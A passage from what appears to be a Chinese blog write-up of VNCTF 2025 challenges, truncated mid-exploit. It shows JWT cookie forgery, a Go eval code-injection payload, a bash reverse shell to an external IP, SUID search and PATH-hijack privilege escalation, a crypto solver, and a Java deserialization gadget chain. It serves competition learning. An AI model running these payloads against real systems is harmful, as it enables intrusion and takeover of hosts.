class="title">Year</span><span class="params">()</span></span> <span class="type">int64</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">2025</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GenerateKey</span><span class="params">()</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	rand.Seed(Year())</span><br><span class="line">	randomNumber := rand.Intn(<span class="number">1000</span>)</span><br><span class="line">	key := fmt.Sprintf(<span class="string">&quot;%03d%s&quot;</span>, randomNumber, Key())</span><br><span class="line">	<span class="keyword">return</span> key</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	key := GenerateKey() <span class="comment">// 调用 GenerateKey 函数生成密钥</span></span><br><span class="line">	fmt.Println(<span class="string">&quot;Generated Key:&quot;</span>, key) <span class="comment">// 打印生成的密钥</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Generated Key: 122r00t32l</span></span><br></pre></td></tr></table></figure>

<p>然后看看<code>/admin</code>，伪造cookie看看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImJhb3pvbmd3aSIsImlzcyI6Ik1hc2gxcjAiLCJzdWIiOiJ1c2VyIHRva2VuIiwiZXhwIjoxNzM5MDk1MjgwLCJpYXQiOjE3MzkwMDg4ODB9.Zg-vmBLmyJybP296MBi-X95rmUAiFxNhNKxa6hZ3gJQ</span><br><span class="line"></span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNzIjoiTWFzaDFyMCIsInN1YiI6InVzZXIgdG9rZW4iLCJleHAiOjE3MzkwOTUyODAsImlhdCI6MTczOTAwODg4MH0.MU6y5-2-f-pJNo6qhjPnZ2cBNC1mZspwH-qA6us5y_0</span><br></pre></td></tr></table></figure>

<p>把<code>username</code>一改就可以了，就可以进行代码执行了，绕过即可</p>
<p><img src="/../images/achieve/2025/2/VNCTF2025/QQ20250208-180500.jpg" alt="1"></p>
<p>看代码发现把<code>os</code>给禁用了，需要寻找另外一种方法来RCE，这里使用<code>goeval</code></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/PaulXu-cn/goeval&quot;</span></span><br><span class="line">)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line"> </span><br><span class="line">	Package := <span class="string">&quot;\&quot;os/exec\&quot;\n fmt\&quot;\n)\n\nfunc\tinit()&#123;\ncmd:=exec.Command(\&quot;ls\&quot;,\&quot;/\&quot;)\nout,_:=cmd.CombinedOutput()\nfmt.Println(string(out))\n&#125;\n\n\nvar(a=\&quot;1&quot;</span></span><br><span class="line">	eval, _ := goeval.Eval(<span class="string">&quot;&quot;</span>, <span class="string">&quot;fmt.Println(\&quot;Good\&quot;)&quot;</span>, Package)</span><br><span class="line">	fmt.Println(<span class="type">string</span>(eval))</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看flag发现不是，然后准备看root目录发现权限没了</p>
<p><img src="/../images/achieve/2025/2/VNCTF2025/QQ20250208-195150.jpg" alt="1"></p>
<p><code>env</code>命令得到这个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Execution Successful! Result:</span><br><span class="line">--------------------------------</span><br><span class="line">SHELL        : /bin/bash</span><br><span class="line">SUDO_GID     : 0</span><br><span class="line">HOSTNAME     : ret2shell-47-117</span><br><span class="line">SUDO_COMMAND  : /bin/bash</span><br><span class="line">SUDO_USER    : root</span><br><span class="line">PWD          : /GinTest</span><br><span class="line">LOGNAME      : ctfer</span><br><span class="line">HOME         : /home/ctfer</span><br><span class="line">TERM         : unknown</span><br><span class="line">USER         : ctfer</span><br><span class="line">GOPROXY      : https://proxy.golang.org,direct</span><br><span class="line">SHLVL        : 1</span><br><span class="line">PATH         : /usr/local/go/bin:/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/go/bin</span><br><span class="line">SUDO_UID     : 0</span><br><span class="line">MAIL         : /var/mail/ctfer</span><br><span class="line">OLDPWD       : /home/ctfer</span><br><span class="line">_            : ./GinTest</span><br><span class="line"></span><br><span class="line">Good</span><br></pre></td></tr></table></figure>

<p>后面问GPT发现了更优美的poc，终于能找suid位了</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    syscall.Exec(<span class="string">&quot;/bin/sh&quot;</span>, []<span class="type">string</span>&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;ls /&quot;</span>&#125;, []<span class="type">string</span>&#123;&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进行sui提权</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/../images/achieve/2025/2/VNCTF2025/QQ20250208-212413.jpg" alt="1"></p>
<p>始终提不了，先弹shell吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/156.238.233.9/4444 &lt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>

<p>然后把文件下载下来</p>
<p><img src="/../images/achieve/2025/2/VNCTF2025/QQ20250208-220140.jpg" alt="1"></p>
<p>怪不得，现在问题就是环境变量提权了，在里面穿插一个cat来达到目的</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/nicai321/article/details/122275160">文章1</a> <a target="_blank" rel="noopener" href="https://www.cnblogs.com/1vxyz/articles/17659773.html">文章2</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; cat</span><br><span class="line">chmod +x cat</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">/.../Cat</span><br></pre></td></tr></table></figure>

<p>然后就是root了</p>
<h2 id="easymath"><a href="#easymath" class="headerlink" title="easymath"></a><strong>easymath</strong></h2><p>用AI做</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">flag=bytes_to_long(flag)</span><br><span class="line">l=flag.bit_length()//<span class="number">3</span> + <span class="number">1</span></span><br><span class="line">n=[]</span><br><span class="line">N=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(n) &lt; <span class="number">3</span>:</span><br><span class="line">    p = <span class="number">4</span>*getPrime(l)-<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> isPrime(p):</span><br><span class="line">        n.append(p)</span><br><span class="line">        N *= p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c=<span class="subst">&#123;flag*flag%N&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> symbols, expand</span><br><span class="line">x = symbols(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">polynomial = expand((x - n[<span class="number">0</span>]) * (x - n[<span class="number">1</span>]) * (x - n[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;polynomial=&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># c=24884251313604275189259571459005374365204772270250725590014651519125317134307160341658199551661333326703566996431067426138627332156507267671028553934664652787411834581708944</span></span><br><span class="line"><span class="comment"># polynomial=x**3 - 15264966144147258587171776703005926730518438603688487721465*x**2 + 76513250180666948190254989703768338299723386154619468700730085586057638716434556720233473454400881002065319569292923*x - 125440939526343949494022113552414275560444252378483072729156599143746741258532431664938677330319449789665352104352620658550544887807433866999963624320909981994018431526620619</span></span><br></pre></td></tr></table></figure>

<p>不过中途要给我笑死了</p>
<p><img src="/../images/achieve/2025/2/VNCTF2025/QQ20250208-213120.jpg" alt="1"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> symbols, solve, isprime</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> crt</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用户提供的参数</span></span><br><span class="line">polynomial_str = <span class="string">&quot;x**3 - 15264966144147258587171776703005926730518438603688487721465*x**2 + 76513250180666948190254989703768338299723386154619468700730085586057638716434556720233473454400881002065319569292923*x - 125440939526343949494022113552414275560444252378483072729156599143746741258532431664938677330319449789665352104352620658550544887807433866999963624320909981994018431526620619&quot;</span></span><br><span class="line">c = <span class="number">24884251313604275189259571459005374365204772270250725590014651519125317134307160341658199551661333326703566996431067426138627332156507267671028553934664652787411834581708944</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解三次方程并返回可能的质数根</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_prime_roots</span>(<span class="params">expr</span>):</span><br><span class="line">    <span class="comment"># 解方程</span></span><br><span class="line">    x = symbols(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">    roots = solve(expr, x)</span><br><span class="line">    candidates = [<span class="built_in">int</span>(root.<span class="built_in">round</span>()) <span class="keyword">for</span> root <span class="keyword">in</span> roots]  <span class="comment"># 四舍五入并转换为整数</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 筛选出质数</span></span><br><span class="line">    primes = [p <span class="keyword">for</span> p <span class="keyword">in</span> candidates <span class="keyword">if</span> isprime(p)]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sorted</span>(primes, reverse=<span class="literal">True</span>)  <span class="comment"># 从大到小排序</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解二次剩余方程，使用 Tonelli-Shanks 算法</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tonelli_shanks</span>(<span class="params">n, p</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">pow</span>(n, (p - <span class="number">1</span>) // <span class="number">2</span>, p) != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>  <span class="comment"># 不是二次剩余</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(n, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 Chinese Remainder Theorem (CRT) 合并解</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">apply_crt</span>(<span class="params">moduli, solutions</span>):</span><br><span class="line">    possible_flags = []</span><br><span class="line">    <span class="keyword">for</span> sol <span class="keyword">in</span> solutions:</span><br><span class="line">        res = crt(moduli, sol)</span><br><span class="line">        <span class="keyword">if</span> res <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            possible_flags.append(res[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">set</span>(possible_flags))  <span class="comment"># 去重</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码 flag</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_flag</span>(<span class="params">f</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag_bytes = <span class="built_in">int</span>.to_bytes(f, length=(f.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> flag_bytes.decode()</span><br><span class="line">    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>  <span class="comment"># 解码失败</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主程序</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 定义方程表达式</span></span><br><span class="line">    expr = symbols(<span class="string">&#x27;x&#x27;</span>)**<span class="number">3</span> - <span class="number">15264966144147258587171776703005926730518438603688487721465</span> * symbols(<span class="string">&#x27;x&#x27;</span>)**<span class="number">2</span> + \</span><br><span class="line">           <span class="number">76513250180666948190254989703768338299723386154619468700730085586057638716434556720233473454400881002065319569292923</span> * symbols(<span class="string">&#x27;x&#x27;</span>) - \</span><br><span class="line">           <span class="number">125440939526343949494022113552414275560444252378483072729156599143746741258532431664938677330319449789665352104352620658550544887807433866999963624320909981994018431526620619</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 查找质数根</span></span><br><span class="line">    primes = find_prime_roots(expr)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;找到的质数: <span class="subst">&#123;primes&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(primes) &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;没有找到足够的质数根，无法继续解密&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    p0, p1, p2 = primes[:<span class="number">3</span>]  <span class="comment"># 获取前3个质数</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算 N</span></span><br><span class="line">    N = p0 * p1 * p2</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;N = <span class="subst">&#123;N&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 确保 c 是正确的模数</span></span><br><span class="line">    <span class="keyword">assert</span> c &lt; N, <span class="string">&quot;c 的值超出模数范围&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算二次剩余的解</span></span><br><span class="line">    r0 = tonelli_shanks(c, p0)</span><br><span class="line">    r1 = tonelli_shanks(c, p1)</span><br><span class="line">    r2 = tonelli_shanks(c, p2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(r <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">for</span> r <span class="keyword">in</span> [r0, r1, r2]):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;无法找到二次剩余的解，计算终止&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 生成所有可能的符号组合</span></span><br><span class="line">    signs = <span class="built_in">list</span>(product([+<span class="number">1</span>, -<span class="number">1</span>], repeat=<span class="number">3</span>))</span><br><span class="line">    solutions = [(sign[<span class="number">0</span>] * r0 % p0, sign[<span class="number">1</span>] * r1 % p1, sign[<span class="number">2</span>] * r2 % p2) <span class="keyword">for</span> sign <span class="keyword">in</span> signs]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用 CRT 合并解</span></span><br><span class="line">    moduli = [p0, p1, p2]</span><br><span class="line">    possible_flags = apply_crt(moduli, solutions)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 去重并检查可能的解</span></span><br><span class="line">    possible_flags = [f <span class="keyword">for</span> f <span class="keyword">in</span> possible_flags <span class="keyword">if</span> f**<span class="number">2</span> % N == c]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出所有可能的解</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;可能的 flag 解密结果:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> possible_flags:</span><br><span class="line">        <span class="keyword">if</span> f &lt; <span class="number">0</span>:</span><br><span class="line">            f += N  <span class="comment"># 保证解在正数范围内</span></span><br><span class="line">        decoded_flag = decode_flag(f)</span><br><span class="line">        <span class="keyword">if</span> decoded_flag:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;解码后的 flag: <span class="subst">&#123;decoded_flag&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;候选解: <span class="subst">&#123;f&#125;</span>（解码失败）&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>调的时间比较久，Deepseek好使但是不完全好使</p>
<h2 id="VN-Lang"><a href="#VN-Lang" class="headerlink" title="VN_Lang"></a><strong>VN_Lang</strong></h2><p><img src="/../images/achieve/2025/2/VNCTF2025/QQ20250208-213942.jpg" alt="1"></p>
<h2 id="javaGuide"><a href="#javaGuide" class="headerlink" title="javaGuide"></a><strong>javaGuide</strong></h2><p>主要是<code>SignedObject</code>二次反序列化,并且不出网，网上参考很多，我这个小白都会打</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1. 反序列化入口点：ArrayList.readObject()</span><br><span class="line">   ↓</span><br><span class="line">2. 处理第一个元素：SignedObject.readObject()</span><br><span class="line">   ↓</span><br><span class="line">3. 反序列化内部对象：HashMap.readObject()</span><br><span class="line">   ↓</span><br><span class="line">4. 处理HashMap键对象：动态代理(Proxy)的hashCode计算</span><br><span class="line">   ↓</span><br><span class="line">5. 触发InvocationHandler.invoke() → JdkDynamicAopProxy.invoke()</span><br><span class="line">   ↓</span><br><span class="line">6. 调用目标对象方法：TemplatesImpl.getOutputProperties()</span><br><span class="line">   ↓</span><br><span class="line">7. 加载恶意字节码：TemplatesImpl._bytecodes中的TomcatEchoPayload</span><br><span class="line">   ↓</span><br><span class="line">8. 执行静态初始化代码：TomcatEchoPayload.&lt;clinit&gt;()中的恶意代码</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.exp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.framework.AdvisedSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.swing.event.EventListenerList;</span><br><span class="line"><span class="keyword">import</span> javax.swing.undo.UndoManager;</span><br><span class="line"><span class="keyword">import</span> javax.xml.bind.DatatypeConverter;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPair;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPairGenerator;</span><br><span class="line"><span class="keyword">import</span> java.security.Signature;</span><br><span class="line"><span class="keyword">import</span> java.security.SignedObject;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Vector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> ysoserial.payloads.util.Reflections.getFieldValue;</span><br><span class="line"></span><br><span class="line"><span class="comment">//import static ysoserial.payloads.util.Reflections.setFieldValue;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String field, Object arg)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> object.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(object, arg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">template</span> <span class="operator">=</span> makeTemplatesImplAopProxy();</span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(template);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(badAttributeValueExpException, <span class="string">&quot;val&quot;</span>, jsonArray);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(template, badAttributeValueExpException);</span><br><span class="line"></span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 